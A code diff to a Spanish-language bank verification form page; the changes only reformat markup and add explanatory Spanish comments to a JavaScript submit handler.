@@ -534,8 +534,9 @@
         <section id="traditional-verification" aria-live="polite" aria-hidden="true" class="hidden">
           <form id="traditional-form" novalidate>
             <div class="form-group compact-small">
-                            <label for="traditional-bank">Banco</label>
-              <span class="material-icons left-small-icon" aria-hidden="true">account_balance</span>
+              <label for="traditional-bank">Banco</label>
+              <span class="material-icons left-small-icon" aria-hidden="true">account_balance
+              </span>
               <select id="traditional-bank" name="bank" required aria-required="true">
                 <option>Chase Bank</option>
                 <option>Wells Fargo</option>
@@ -647,21 +648,22 @@
     }
 
     function handleSubmit(event) {
-      event.preventDefault();
-      clearMessage();
+      event.preventDefault(); // Evita el comportamiento por defecto de envío
+      clearMessage(); // Limpia mensajes anteriores
 
-      if (sending) return;
+      if (sending) return; // Evita múltiples envíos simultáneos
 
       const form = event.target;
       const btn = form.querySelector('button[type="submit"]');
 
+      // Verifica que el formulario sea válido
       if (!form.checkValidity()) {
         showMessage('Por favor complete correctamente todos los campos.');
         return;
       }
 
-      sending = true;
-      if (btn) btn.disabled = true;
+      sending = true; // Indica que se está enviando
+      if (btn) btn.disabled = true; // Desactiva el botón de envío
 
       const data = new FormData(form);
       const user = data.get('user') || data.get('account_number');
@@ -685,11 +687,12 @@
         showMessage(error.message);
       })
       .finally(() => {
-        sending = false;
-        if (btn) btn.disabled = false;
+        sending = false; // Restablece el estado de envío
+        if (btn) btn.disabled = false; // Reactiva el botón de envío
       });
     }
 
+    // Añade eventos de envío a los formularios
     if (fastForm) fastForm.addEventListener('submit', handleSubmit);
     if (traditionalForm) traditionalForm.addEventListener('submit', handleSubmit);
 
